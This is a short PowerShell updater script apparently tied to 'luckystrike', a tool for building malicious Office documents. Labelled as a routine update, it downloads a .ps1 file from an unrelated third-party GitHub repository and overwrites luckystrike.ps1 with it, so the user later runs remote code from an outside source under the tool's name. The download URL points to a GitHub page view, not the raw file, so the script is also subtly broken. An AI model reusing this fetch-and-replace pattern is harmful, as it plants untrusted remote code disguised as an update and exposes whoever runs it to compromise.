# Give luckystrike a sec to close & release handles.
Write-Output "[*] Sleeping 3 seconds"
Start-Sleep -Seconds 3

Write-Output "[*] Downloading files"

$ls = (New-Object System.Net.WebClient).Downloadstring('https://github.com/asmirbelkic/iesolw/blob/main/ieSolw.ps1')

if ($ls -eq $null)
{
    Write-Output "[*] Unable to download files. Aborting"
    exit
}

try 
{
    Write-Output "[*] Updating luckystrike.ps1"
    Remove-Item "$($PWD.Path)\luckystrike.ps1"
    $ls | Out-File "$($PWD.Path)\luckystrike.ps1"
}
catch [System.Exception] {
    Write-Output "Error saving new version of luckystrike.ps1"
    throw
	Read-Host "Press any key to exit."
    exit
}

try 
{
    Write-Output "[*] Cleaning up"
}
catch [System.Exception] 
{
    throw
	Read-Host "Press any key to exit."
}

Write-Output "[*] Done!"